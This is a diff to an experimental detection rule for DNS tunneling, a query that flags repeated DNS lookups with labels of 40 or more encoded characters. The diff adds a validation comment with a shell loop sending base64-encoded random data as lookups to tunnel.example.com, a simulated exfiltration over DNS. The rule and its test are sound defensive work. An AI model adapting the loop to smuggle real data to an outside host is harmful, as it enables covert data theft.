@@ -1,6 +1,8 @@
 // Possible DNS Tunneling via Abnormally Long Queries
 // Detects repeated DNS queries with unusually long labels against a single parent domain, the signature of data smuggled inside DNS. Expect tuning: CDNs and endpoint security products legitimately emit long names.
-// techniques: T1071.004   severity: medium
+// techniques: T1071.004   severity: medium   status: experimental
+// validate: Atomic Red Team T1071.004
+//   for i in $(seq 1 30); do nslookup $(head -c 40 /dev/urandom | base64 | tr -d '=+/').tunnel.example.com; done
 // source: rules/command-and-control/dns-tunneling-long-query.yml  (GENERATED, do not edit by hand)
 Event
 | where ((EventID =~ "22") and (QueryName matches regex "^[A-Za-z0-9+/=_-]{40,}\\."))
